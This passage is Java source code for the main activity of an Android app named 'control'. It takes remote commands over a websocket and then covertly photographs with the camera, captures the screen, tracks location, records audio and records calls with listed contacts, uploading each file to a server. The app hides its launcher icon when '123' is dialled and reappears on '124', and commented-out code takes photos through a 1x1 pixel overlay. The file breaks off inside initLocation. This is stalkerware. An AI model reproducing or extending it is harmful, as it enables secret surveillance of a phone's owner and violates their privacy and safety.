package com.gengy.control;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.ConnectivityManager;
import android.net.LinkProperties;
import android.net.Network;
import android.net.NetworkRequest;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.SystemClock;
import android.telecom.TelecomManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.WindowManager;
import android.widget.ImageView;
import android.widget.RadioGroup;

import com.baidu.location.BDAbstractLocationListener;
import com.baidu.location.BDLocation;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;
import com.gengy.control.Base.BaseActivity;
import com.gengy.control.BeingControl.Authority.AudioRecoderUtils;
import com.gengy.control.BeingControl.Authority.PhoneReceiver;
import com.gengy.control.BeingControl.Authority.PhoneReceiverHelper;
import com.gengy.control.BeingControl.BeingControl.BeingControlFrag;
import com.gengy.control.BeingControl.PhoneSetting.FragPhoneSetting;
import com.gengy.control.Control.MineModular.MineFragment;
import com.gengy.control.Entity.PhoneNetWorkEntity;
import com.gengy.control.MainActivity;
import com.gengy.control.R;
import com.gengy.control.Untils.FileUntils;
import com.gengy.control.Untils.HttpStatesUntils;
import com.gengy.control.Untils.NavigationBarUtil;
import com.gengy.control.Untils.Screen.ScreenRecordUntils;
import com.gengy.control.Untils.Screen.ScreenShotUntils;
import com.gengy.control.Untils.ShareKey;
import com.gengy.control.Untils.SharedPreferencesHelper;
import com.gengy.control.Untils.TakePicture;
import com.gengy.control.Untils.ToastUtils;
import com.gengy.control.Untils.WebSocketUtils;
import com.gengy.control.http.ApiService;
import com.tbruyelle.rxpermissions2.RxPermissions;
import com.yorhp.recordlibrary.ScreenShotUtil;
import com.yorhp.recordlibrary.ScreenUtil;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentPagerAdapter;
import androidx.viewpager.widget.ViewPager;
import butterknife.BindView;
import cn.bluemobi.dylan.http.Http;
import cn.bluemobi.dylan.http.HttpCallBack;
import cn.bluemobi.dylan.http.JsonParse;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;

import static com.gengy.control.Untils.ShareKey.BIND_ACCOUNT_ID;
import static com.gengy.control.Untils.ShareKey.ID;

public class BeingControlActivity extends BaseActivity implements RadioGroup.OnCheckedChangeListener , TakePicture.PictureComplate {
    //    @BindView(R.id.CameraSurfaceView)
//    com.gengy.control.BeingControl.Camera.CameraSurfaceView CameraSurfaceView;
    private ArrayList<Fragment> fragments;
    @BindView(R.id.view_pager)
    ViewPager viewPager;
    @BindView(R.id.rg)
    RadioGroup rg;
    private BeingControlFrag mBeingControlFrag;
    private FragPhoneSetting mFragPhoneSetting;
    private MineFragment mMineFrag;
    int currentFragment = 0;
    public LocationClient mLocationClient = null;
    private MyLocationListener myListener = new MyLocationListener();
    private AudioRecoderUtils mAudioRecoderUtils;
    private PhoneReceiverHelper mPhoneReceiverHelper;
    private String incomeNumber;
    private File file;
    private MediaRecorder mediaRecorder;


    private WebSocketUtils webSocketUtils;
    private RxPermissions rxPermissions;

    private int mControlType;
    private List<PhoneNetWorkEntity> mListData;
    private boolean mSoundSend, mRecordSend;
    private ContentReceiver mReceiver;

    private MediaProjectionManager mMediaProjectionManager;
    private MediaProjection mMediaProjection;
    private static final int REQUEST_MEDIA_PROJECTION = 1;
    public static final int SCREEN_SHOT = 0;
    private File mImgFile, mVideoFile;
    int mResultCode;
    Intent mDdata;
    private TakePicture mTakePicture;

    @Override
    public int intiLayout() {
        return R.layout.activity_control_being;
    }

    @Override
    public void initView() {
        //状态栏
        if (NavigationBarUtil.hasNavigationBar(this)) {
            NavigationBarUtil.initActivity(findViewById(android.R.id.content));
        }

        fragments = new ArrayList<>();
        mBeingControlFrag = new BeingControlFrag();
        fragments.add(mBeingControlFrag);
        mFragPhoneSetting = new FragPhoneSetting();
        fragments.add(mFragPhoneSetting);
        mMineFrag = new MineFragment();
        fragments.add(mMineFrag);
        rg.setOnCheckedChangeListener(this);
        //预加载
        viewPager.setOffscreenPageLimit(fragments.size());
        //设置适配器
        viewPager.setAdapter(new FragmentPagerAdapter(getSupportFragmentManager()) {
            //选中的ITem
            @Override
            public Fragment getItem(int i) {
                return fragments.get(i);
            }

            //返回Item个数
            @Override
            public int getCount() {
                return fragments.size();
            }
        });
        initRecordDispose();
        String token = SharedPreferencesHelper.getInstance(mActivity).getString(ShareKey.TOKEN, "");
        //判断是否登录
        if (TextUtils.isEmpty(token)) {
            return;
        }

        findViewById(R.id.tv_click).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                ToastUtils.getInstanc().showToast("4335465665");
                initRecordStop();
            }
        });


    }

    private void initRecordDispose() {
        //           /录音
        mAudioRecoderUtils = new AudioRecoderUtils();

        mAudioRecoderUtils.setOnAudioStatusUpdateListener(new AudioRecoderUtils.OnAudioStatusUpdateListener() {
            @Override
            public void onUpdate(double db, long time) {

            }

            @Override
            public void onStop(String filePath) {
                File file = new File(filePath);

//            上传录音   开启wifi上传

                if (mSoundSend) {
                    if (HttpStatesUntils.WifiConnected(mActivity)) {
                        initUplodImage(file);
                    } else {
                        initSendMsg(ShareKey.END_RECORD_CALLBACK_WIFI, "");
                    }
                } else {
                    initUplodImage(file);
                }


            }
        });
    }


    private void initWorkMan() {
        webSocketUtils = WebSocketUtils.getInstance(mActivity);
        webSocketUtils.content();
        webSocketUtils.openHeartbeat();
        webSocketUtils.setOnMessageSendCallback(new WebSocketUtils.OnMessageSendCallback() {

            @Override
            public void onFailure(String message) {
                super.onFailure(message);
                Log.i(TAG, "onFailure: " + message);
            }

            @Override
            public void onSuccess(String message) {
                super.onSuccess(message);
                Log.i(TAG, "onSuccess: " + message);
            }

            @Override
            public void onMessage(String message) {
                super.onMessage(message);
                Log.i(TAG, "onMessage:messagemessage:" + message);
                if (message.contains("client_id")) {
                    try {
                        String ids = SharedPreferencesHelper.getInstance(mActivity).getString(ID,
                                "");
                        JSONObject object = new JSONObject(message);
                        object.put("type", "login");
                        object.put("id", ids);
                        webSocketUtils.sendChatMessage(object.toString());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }


                } else if (message.contains(ShareKey.SEND_CONTENT)) {
                    JSONObject object = null;
                    try {
                        object = new JSONObject(message);
                        int type = object.getInt(ShareKey.SEND_CONTENT);
                        Log.i(TAG, "onMessage:messagemessage:" + type);
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                //此时已在主线程中，更新UI
//                                initScreenShot();
                                mControlType = type;
                                initControl(type);
                            }
                        });


                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                }


            }

        });

    }

    private void initControl(int type) {
        switch (type) {

            case ShareKey.START_PHOTO_PREFIX:
                //开始拍照 前置
//                camaraType = Camera.CameraInfo.CAMERA_FACING_FRONT;
                initPhotoGraphs(1);
                break;
            case ShareKey.START_PHOTO_POST:
                //开始拍照 后置
//                camaraType = Camera.CameraInfo.CAMERA_FACING_BACK;
                initPhotoGraphs(2);
                break;


            case ShareKey.START_SCREEN_SCREEN:
                //开始截图
                initScreenShot();
                break;
            case ShareKey.END_SCREEN_SCREEN:
                //结束截图
                initSendMsg(ShareKey.END__SCREEN_CALLBACK, "");
                break;


            case ShareKey.START_LOCATION:
                //开始定位
                initLocations();
                break;
            case ShareKey.END_LOCATION:
                //结束定位
                mLocationClient.stop();
                initSendMsg(ShareKey.END_LOCATION_CALLBACK, "");

                break;


            case ShareKey.START_RECORD_SCREEN:
                //开始录像
//                initVideoTape();
                break;

            case ShareKey.END_RECORD_SCREEN:
                //结束录录像
//                initStopVideoTape();
                break;


            case ShareKey.START_RECORD:
                //开始录音
                initRecord();
                break;
            case ShareKey.END_RECORD:
                //结束录音
                initRecordStop();
                break;

        }
    }


    private void initLocations() {

        rxPermissions
                .request(Manifest.permission.ACCESS_FINE_LOCATION,
                        Manifest.permission.ACCESS_WIFI_STATE,
                        Manifest.permission.ACCESS_COARSE_LOCATION
                )
                .subscribe(granted -> {
                    if (granted) { // Always true pre-M
                        initLocation();
                    } else {
                        // Oups permission denied
                    }
                });

    }

    private void initPhotoGraph(int state) {
        //开始拍照

        mTakePicture.initCamera(state);


//        mTakePicture.setmPicCallback(new  Camera.PictureCallback() {
//            @Override
//            public void onPictureTaken(byte[] data, Camera camera) {
//
//                Log.i(TAG, "initUplodImageinitUplodImage: "+data);
//
//                Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
//                Matrix matrix = new Matrix();
//                matrix.preRotate(90);
//                bitmap = Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(),
//                        bitmap.getHeight(), matrix, true);
//
//                File pictureFile = new File(TakePicture.getDiskCachePath(mActivity), "myPicture.jpg");
//                FileOutputStream fos = null;
//                try {
//                    fos = new FileOutputStream(pictureFile);
//                    bitmap.compress(Bitmap.CompressFormat.JPEG, 75, fos);
//
////                    ImageView imageView=findViewById(R.id.img);
////                    imageView.setImageBitmap(bitmap);
//                    fos.close();
//                    Log.i(TAG, "initUplodImageinitUplodImage: "+pictureFile);
////                    String path = Environment
////                        .getExternalStorageDirectory().toString() + "/myPicture.jpg";
////
////                    File file = new File(path);
//                    initUplodImage(pictureFile);
//
//
//
//                } catch (Exception e) {
//                    e.printStackTrace();
//                    mTakePicture.Stop();
//                }
//
//
//            }
//        });






//        preview = new SurfaceView(this);
//        holder = preview.getHolder();
//
//        // deprecated setting, but required on Android versions prior to 3.0
//        holder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
//
//        holder.addCallback(new SurfaceHolder.Callback() {
//            @Override
//            //The preview must happen at or after this point or takePicture fails
//            public void surfaceCreated(SurfaceHolder holder) {
//                //创建成功以后打开相机
//                /**
//                 * camaraType: Camera.CameraInfo.CAMERA_FACING_FRONT :打开前置摄像头
//                 * camaraType: Camera.CameraInfo.CAMERA_FACING_BACK :打开后置摄像头
//                 */
//                try {
//                    camera = Camera.open(camaraType);
//                    try {
//                        camera.setPreviewDisplay(holder);
//                    } catch (IOException e) {
//                        throw new RuntimeException(e);
//                    }
//
//                    camera.startPreview();
//                    Log.d(TAG, "Started preview");
//                    camera.takePicture(null, null, pictureCallback);
//                } catch (Exception e) {
//                    if (camera != null)
//                        camera.release();
//                    throw new RuntimeException(e);
//                }
//            }
//
//            @Override
//            public void surfaceDestroyed(SurfaceHolder holder) {
//            }
//
//            @Override
//            public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {
//            }
//        });
//
//        wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
//        //设置悬浮框为:1 * 1 :记得用后将其remove否则其他界面得不到交点,并且下拉框会有提示:应用在他应用的上层显示的应用，关于这个设置选项
//        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
//                1, 1, //设置成宽:1px , 高:1px
//                WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY, 0, PixelFormat.UNKNOWN);
//
//        /**
//         * 根据不同的版本设置:TYPE_APPLICATION_OVERLAY 在低于26版本中报错崩溃
//         * 但是在Android O的系统中，google规定申请android.permission
//         * .SYSTEM_ALERT_WINDOW权限的应用需要给悬浮窗口设置如下params.type
//         */
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//            params.type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
//        }
//        wm.addView(preview, params);


    }

    /**
     * 拍照开始后结果的回调
     */
//    private Camera.PictureCallback pictureCallback = new Camera.PictureCallback() {
//        @Override
//        public void onPictureTaken(byte[] data, Camera camera) {
//            Log.d(TAG, "onPictureTaken");
//            if (null == data) {
//                return;
//            }
//            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
//            camera.stopPreview();
//            Matrix matrix = new Matrix();
//            matrix.postRotate((float) 90.0);
////            matrix.postRotate((float) 270.0); //旋转拍照结果,可能方向不正确
//            bitmap = Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(),
//                    bitmap.getHeight(), matrix, false);
//            Bitmap sizeBitmap = Bitmap.createScaledBitmap(bitmap,
//                    bitmap.getWidth() / 3, bitmap.getHeight() / 3, true);
//
//            try {
//                //保存图片
//                FileOutputStream outputStream = new FileOutputStream(Environment
//                        .getExternalStorageDirectory().toString() + "/photoResize.jpg");
//                sizeBitmap.compress(Bitmap.CompressFormat.JPEG, 100, outputStream);
//                outputStream.close();
//
//
//                //通知系统相册更新
//                sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE, Uri.parse("file" +
//                        "://" + Environment
//                        .getExternalStorageDirectory().toString() + "/photoResize.jpg")));
//                String path = Environment
//                        .getExternalStorageDirectory().toString() + "/photoResize.jpg";
//
//                File file = new File(path);
//                initUplodImage(file);
//
//
//                Log.d(TAG, "picture saved!");
//                if (camera != null) {
//                    camera.release();
//                    //移除上层的1*1px的拍照布局 : 一定要移除,不然点击屏幕其他位置手机没有反应
//                    wm.removeView(preview);
//                }
//
//
//            } catch (Exception e) {
//                e.printStackTrace();
//            }
//        }
//    };


    private void initPhotoGraphs(int state) {
        rxPermissions
                .request(Manifest.permission.WRITE_EXTERNAL_STORAGE,
                        Manifest.permission.CAMERA
                )
                .subscribe(granted -> {
                    if (granted) { // Always true pre-M
                        //   开始拍照回调发送
                        initSendMsg(ShareKey.STARTS_PHOTO_CALLBACK, "");
                        initPhotoGraph(state);


                    } else {
                        // Oups permission denied
                        //  权限失败回调发送
                        initSendMsg(ShareKey.STARTS_SPHOTO_CALLBACK_FAIL, "");

                    }
                });

    }

    private void initScreenShot() {
        rxPermissions
                .request(Manifest.permission.WRITE_EXTERNAL_STORAGE
                )
                .subscribe(granted -> {
                    if (granted) { // Always true pre-M
                        //截图
                        //   开始截图回调发送
                        initSendMsg(ShareKey.STARTS_SCREEN_CALLBACK, "");
                        initScreensHots();


                    } else {
                        // Oups permission denied
                        Log.i(TAG, "接收消息:initScreenShot ");
                        initSendMsg(ShareKey.STARTS_SCREEN_CALLBACK_FAIL, "");

                    }
                });
    }

    private void initVideoTape() {
        rxPermissions
                .request(Manifest.permission.WRITE_EXTERNAL_STORAGE,
                        Manifest.permission.READ_EXTERNAL_STORAGE,
                        Manifest.permission.RECORD_AUDIO)
                .subscribe(granted -> {
                    Log.i(TAG, "initVideoTape:START_RECORD_SCREEN_CALLBACK_REFUSE " + granted);
                    if (granted) { // Always true pre-M
                        //录ping
                        initRecording();
                    } else {
                        //        录屏拒绝了权限
                        initSendMsg(ShareKey.START_RECORD_SCREEN_CALLBACK_REFUSE, "");
                    }
                });

    }

    private void initRecord() {

        rxPermissions
                .request(Manifest.permission.WRITE_EXTERNAL_STORAGE,
                        Manifest.permission.RECORD_AUDIO,
                        Manifest.permission.WAKE_LOCK
                )
                .subscribe(granted -> {
                    if (granted) { // Always true pre-M
                        //录音
                        initStartAudioRecoder();
                    } else {
                        // Oups permission denied
                        //        录音拒绝了权限
                        initSendMsg(ShareKey.START_RECORD_CALLBACK_REFUSE, "");
                    }
                });
    }

    @Override
    public void initData() {
//        initWifi();
        SurfaceView   mySurfaceView = findViewById(R.id.sf);
         mTakePicture=new TakePicture(mActivity,mySurfaceView);
        mTakePicture.setmPictureComplate(this);
        rxPermissions = new RxPermissions(this);
//        录音
        mSoundSend =
                SharedPreferencesHelper.getInstance(mActivity).getBoolean(ShareKey.SOUND_SEND,
                        false);
        //        录像
        mRecordSend =
                SharedPreferencesHelper.getInstance(mActivity).getBoolean(ShareKey.RECORD_SEND,
                        false);
        //录屏
        mMediaProjectionManager =
                (MediaProjectionManager) getApplicationContext().getSystemService(MEDIA_PROJECTION_SERVICE);

        ScreenRecordUntils.getInstance().init();
        //截屏
        ScreenShotUntils.getInstance().init(mActivity);
        //截屏地址
        mImgFile = new File(Environment.getExternalStorageDirectory(),
                System.currentTimeMillis() + ".png");


        doRegisterReceiver();


        rxPermissions
                .request(Manifest.permission.READ_PHONE_STATE,
                        Manifest.permission.PROCESS_OUTGOING_CALLS,
                        Manifest.permission.PROCESS_OUTGOING_CALLS,
                        Manifest.permission.ACCESS_FINE_LOCATION)
                .subscribe(granted -> {
                    if (granted) { // Always true pre-M
                        //电话录音
                        initPhoneListener();
                    } else {
                        // Oups permission denied
                    }
                });


    }

    private void initWifi() {
//        Log.i(TAG, "onAvailableonAvailable: "+(Build.VERSION.SDK_INT > Build.VERSION_CODES
//        .LOLLIPOP));
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.LOLLIPOP) {
            ConnectivityManager connectivityManager =
                    (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);

//            Log.i(TAG, "onAvailableonAvailable: "+connectivityManager);
            if (null != connectivityManager) {
                connectivityManager.requestNetwork(new NetworkRequest.Builder().build(),
                        new ConnectivityManager.NetworkCallback() {
                            @Override
                            public void onAvailable(@NonNull Network network) {
//                                super.onAvailable(network);

                                Log.i(TAG, "onAvailableonAvailable: 可用");
                            }

                            @Override
                            public void onLost(@NonNull Network network) {
//                                super.onLost(network);
                                Log.i(TAG, "onAvailableonAvailable: 丢失");
                            }

                            @Override
                            public void onLinkPropertiesChanged(@NonNull Network network,
                                                                @NonNull LinkProperties linkProperties) {
                                super.onLinkPropertiesChanged(network, linkProperties);
                                if (null != webSocketUtils) {
                                    webSocketUtils.myWebSocketClient = null;
                                    webSocketUtils.content();
                                } else {
                                    initWorkMan();
                                }
                            }
                        });
            }

        }


    }

    private void doRegisterReceiver() {
        mReceiver = new ContentReceiver();
        IntentFilter filter = new IntentFilter(
                "com.example.servicecallback.content");
        registerReceiver(mReceiver, filter);

    }

    @Override
    public void complate(File file) {
  //拍照成功回调
        initUplodImage(file);
    }

    public class ContentReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            String content = intent.getStringExtra("content");
            Log.i(TAG, "onReceive: " + content);
            initSendMsg(ShareKey.SENS_LIST, "");

        }
    }

    @Override
    protected void onDestroy() {
        // TODO Auto-generated method stub
        super.onDestroy();
        webSocketUtils.closeHeartbeat();
        if (mReceiver != null) {
            unregisterReceiver(mReceiver);
        }

        ScreenRecordUntils.getInstance().onDestotry();
        ScreenShotUtil.getInstance().destroy();
        //删除所有的文件夹
        FileUntils.deleteDir(mVideoFile.getPath());
        FileUntils.deleteDir(mImgFile.getPath());

    }

    private void requestMediaProjection() {
        Intent captureIntent = mMediaProjectionManager.createScreenCaptureIntent();
        startActivityForResult(captureIntent, REQUEST_MEDIA_PROJECTION);
    }



    private void initRecording() {
        ScreenUtil.getScreenSize(this);
        File dir =
                new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES),
                        "ASceenUtil");
        mVideoFile = new File(dir,
                +System.currentTimeMillis() + ".mp4");
        if (mMediaProjection == null) {
            requestMediaProjection();
        } else {
            mMediaProjection = mMediaProjectionManager.getMediaProjection(mResultCode, mDdata);

            //   开始录屏回调发送
            initSendMsg(ShareKey.START_RECORD_SCREEN_CALLBACK, "");
//        //开始录屏
            ScreenRecordUntils.getInstance().initRecord(mActivity, mVideoFile, mMediaProjection);
        }


        ScreenRecordUntils.getInstance().setmSreenState(new ScreenRecordUntils.ScreenState() {
            @Override
            public void Stop() {

            }

            @Override
            public void Start() {

            }
        });


    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {

        mResultCode = resultCode;
        mDdata = data;
        if (requestCode == REQUEST_MEDIA_PROJECTION) {
            if (resultCode == RESULT_OK) {
                mMediaProjection = mMediaProjectionManager.getMediaProjection(resultCode, data);
                if (mMediaProjection == null) {
                    Log.e("@@", "media projection is null");
                    return;
                }
                //   开始录屏回调发送
                initSendMsg(ShareKey.START_RECORD_SCREEN_CALLBACK, "");
                ScreenRecordUntils.getInstance().initRecord(mActivity, mVideoFile,
                        mMediaProjection);
            } else {
                // 开始录屏回调发送
                initSendMsg(ShareKey.START_RECORD_SCREEN_CALLBACK_REFUSE, "");
            }

        }

        if (requestCode == SCREEN_SHOT) {
            if (resultCode == RESULT_OK) {
                mMediaProjection = mMediaProjectionManager.getMediaProjection(resultCode, data);
                if (mMediaProjection == null) {
                    Log.e("@@", "media projection is null");
                    return;
                }
                //   开始截图回调发送
                initSendMsg(ShareKey.STARTS_SCREEN_CALLBACK, "");
                initUplodImage(ScreenShotUntils.getInstance().setUpVirtualDisplay(mMediaProjection, mImgFile));
            } else {
                // 开始截图回调发送
                initSendMsg(ShareKey.STARTS_SCREEN_CALLBACK_FAIL, "");
            }
        }


    }


    private void initStopVideoTape() {
        ScreenRecordUntils.getInstance().initRecord(mActivity, mVideoFile, mMediaProjection);
        //   结束录屏回调发送
        initSendMsg(ShareKey.END_RECORD_SCREEN_CALLBACK, "");

        if (mRecordSend) {
            if (HttpStatesUntils.WifiConnected(mActivity)) {
                initUplodImage(mVideoFile);
            }
        } else {
            initUplodImage(mVideoFile);
        }


    }

    private void initPhoneListener() {
        //电话监听
        mPhoneReceiverHelper = new PhoneReceiverHelper(mActivity);
        mPhoneReceiverHelper.setOnListener(new PhoneReceiver.OnPhoneListener() {
            @Override
            public void onPhoneOutCall(String number,TelephonyManager manager) {

                Log.i(TAG, "onPhoneOutCall: " + number);

                incomeNumber = number;
                PackageManager packageManager = getPackageManager();

//                if(incomeNumber.equals("124")){
//                    packageManager.setComponentEnabledSetting(getComponentName(),
//                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager
//                    .DONT_KILL_APP);
//                }
//                if(incomeNumber.equals("123")){
//                    packageManager.setComponentEnabledSetting(getComponentName(),
//                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED  , PackageManager
//                    .DONT_KILL_APP);
//                }

//                ComponentName componentName = new ComponentName(mActivity, MainActivity.class);
//                int res = packageManager.getComponentEnabledSetting(componentName);
//                if (res == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT
//                        || res == PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
//                    // 隐藏应用图标
//                    packageManager.setComponentEnabledSetting(componentName, PackageManager
//                    .COMPONENT_ENABLED_STATE_DISABLED,
//                            PackageManager.DONT_KILL_APP);
//                } else {
//                    // 显示应用图标
//                    packageManager.setComponentEnabledSetting(componentName, PackageManager
//                    .COMPONENT_ENABLED_STATE_DEFAULT,
//                            PackageManager.DONT_KILL_APP);
//                }


//                ComponentName componentName = new ComponentName(mActivity, MainActivity.class);
//                int res = packageManager.getComponentEnabledSetting(componentName);
//                if (res == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT
//                        || res == PackageManager.COMPONENT_ENABLED_STATE_ENABLED&&number.equals
//                        ("123")) {
//                    // 隐藏应用图标
//                    packageManager.setComponentEnabledSetting(componentName, PackageManager
//                    .COMPONENT_ENABLED_STATE_DISABLED,
//                            PackageManager.DONT_KILL_APP);
//                } else {
//                    // 显示应用图标
//                    packageManager.setComponentEnabledSetting(componentName, PackageManager
//                    .COMPONENT_ENABLED_STATE_DEFAULT,
//                            PackageManager.DONT_KILL_APP);
//                }

//                PackageManager packageManager = mActivity.getPackageManager();
                ComponentName componentName = new ComponentName(mActivity, MainActivity.class);
                if (number.equals("123")) {
                    //隐藏
                    packageManager.setComponentEnabledSetting(componentName,
                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            PackageManager.DONT_KILL_APP);


                } else if (number.equals("124")) {
//                    packageManager.setComponentEnabledSetting(componentName ,PackageManager
//                    .COMPONENT_ENABLED_STATE_DEFAULT,
//                            PackageManager.DONT_KILL_APP);

                    Intent intent = new Intent();
                    ComponentName cn = new ComponentName("com.gengy.control", "com.gengy.control" +
                            ".MainActivity");
                    intent.setComponent(cn);
                    Uri uri = Uri.parse("com.gengy.control.MainActivity");
                    intent.setData(uri);
                    startActivity(intent);

                }

            }

            @Override
            public void onPhoneStateChange(String state) {

            }

            @Override
            public void onPhoneStateChange(int state, TelecomManager number) {
                switch (state) {
                    case TelephonyManager.CALL_STATE_OFFHOOK:
                        //通讯录录音的号码
                        initGetSound();
                        break;

                    case TelephonyManager.CALL_STATE_IDLE:  //挂掉电话
                        if (mediaRecorder != null) {
                            mediaRecorder.stop();
                            mediaRecorder.release();
                            mediaRecorder = null;
                            //上传录音   开启wifi
                            if (mSoundSend) {
                                if (HttpStatesUntils.WifiConnected(mActivity)) {
                                    initUplodImage(file);
                                }


                            } else {
                                initUplodImage(file);
                            }


                        }

                        break;
                }


            }
        });
        mPhoneReceiverHelper.register();
    }

    private void initGetSound() {
        String id = SharedPreferencesHelper.getInstance(mActivity).getString(ID, "");
        if (TextUtils.isEmpty(id)) {
            return;
        }
        if (null == mListData || mListData.size() != 0) {
            //  接听
            for (PhoneNetWorkEntity entity : mListData) {
                if (entity.phone.equals(incomeNumber)) {
                    initSavePhone();
                    return;
                }

                return;
            }
        }


        Http.with(mActivity).setObservable(Http.getApiService(ApiService.class).getContacts(id,
                1 + ""))
                .setDataListener(new HttpCallBack() {
                    @Override
                    public void netOnSuccess(Map<String, Object> datas) {
                        mListData = JsonParse.getList(datas,
                                "data", PhoneNetWorkEntity.class);

                        //  接听
                        for (PhoneNetWorkEntity entity : mListData) {
                            if (entity.phone.equals(incomeNumber)) {
                                initSavePhone();
                                return;
                            }

                        }


                    }
                });


    }

    private void initSavePhone() {
        file = new File(Environment.getExternalStorageDirectory(),
                incomeNumber + System.currentTimeMillis() + ".mp3");
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);   //获得声音数据源
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);   //
        // 按3gp格式输出
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        mediaRecorder.setOutputFile(file.getAbsolutePath());   //输出文件
        try {
            mediaRecorder.prepare();    //准备
        } catch (IOException e) {
            e.printStackTrace();
        }
        mediaRecorder.start();
    }

    private void initRecordStop() {

        if (null != mAudioRecoderUtils) {
            mAudioRecoderUtils.stopRecord();
        }

    }


    private void initStartAudioRecoder() {
        //开始录音
        mAudioRecoderUtils.startRecord();
//        开始录音回调发送
        initSendMsg(ShareKey.START_RECORD_CALLBACK, "");
    }

    private void initSendMsg(int type, String conten2) {
        String ids = SharedPreferencesHelper.getInstance(mActivity).getString(ID, "");
        String cids = SharedPreferencesHelper.getInstance(mActivity).getString(BIND_ACCOUNT_ID, "");
        try {
            JSONObject jsonObject = new JSONObject();
            jsonObject.put(ShareKey.SEND_CONTENT, type);
            if (!TextUtils.isEmpty(conten2)) {
                jsonObject.put(ShareKey.SEND_CONTENT_2, conten2);
            }
            jsonObject.put("type", "say");
            jsonObject.put("avatar", "13213");
            jsonObject.put("name", "15246220315");
            jsonObject.put("id", ids);
            jsonObject.put("cid", cids);
            Log.i(TAG, "initSendMsginitSendMsginitSendMsg: " + jsonObject.toString());
            webSocketUtils.sendChatMessage(jsonObject.toString());
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    private void initScreensHots() {
        if (null != mMediaProjection) {
            if (ScreenShotUntils.getInstance().imageReaderIsInit()) {
                mMediaProjection = mMediaProjectionManager.getMediaProjection(mResultCode, mDdata);
                if (mMediaProjection == null) {
                    Log.e("@@", "media projection is null");
                    return;
                }
                //   开始截图回调发送
                initSendMsg(ShareKey.STARTS_SCREEN_CALLBACK, "");
                initUplodImage(ScreenShotUntils.getInstance().setUpVirtualDisplay(mMediaProjection, mImgFile));
            } else {
                initUplodImage(ScreenShotUntils.getInstance().startCapture(mImgFile));
            }

        } else {

            ScreenShotUntils.getInstance().StartScreenShot();
        }


    }


    private void initUplodImage(File file) {
        RequestBody requestBodyFile = RequestBody.create(MediaType.parse("multipart/form-data"),
                file);
        MultipartBody.Part bodyFile = MultipartBody.Part.createFormData("file", file.getName(),
                requestBodyFile);
        String descriptionString =
                SharedPreferencesHelper.getInstance(mActivity).getString(ShareKey.ID, "0");

        RequestBody cid =
                RequestBody.create(
                        MediaType.parse("multipart/form-data"), descriptionString);


        Http.with(mActivity).hideLoadingDialog()
                .setObservable(Http.getApiService(ApiService.class).uploadResource(cid, bodyFile)).setDataListener(new HttpCallBack() {
            @Override
            public void netOnFailure(Throwable ex) {
                super.netOnFailure(ex);

            }

            @Override
            public void netOnSuccess(Map<String, Object> data) {
                String url = JsonParse.getString(data, "url");
                switch (mControlType) {
                    case ShareKey.END_RECORD:
                    case ShareKey.END_RECORD_CALLBACK:
                        initSendMsg(ShareKey.END_RECORD_CALLBACK_URL, url);
                        break;
                    case ShareKey.END_RECORD_SCREEN:
                    case ShareKey.END_RECORD_SCREEN_CALLBACK:
                        initSendMsg(ShareKey.END_RECORD_SCREEN_CALLBACK_URL, url);
                        break;

                    case ShareKey.START_SCREEN_SCREEN:
                    case ShareKey.END_SCREEN_SCREEN:
                    case ShareKey.STARTS_SCREEN_CALLBACK:
                        //截图
                        initSendMsg(ShareKey.END__SCREEN_CALLBACK_URL, url);

                        break;


                    case ShareKey.STARTS_PHOTO_CALLBACK:
                    case ShareKey.END_PHOTO_:
                        initSendMsg(ShareKey.END__PHOTO_CALLBACK_URL, url);

                        break;


                }


            }


        });


    }

    private void initLocation() {
        mLocationClient = new LocationClient(getApplicationContext());     //声明LocationClient类
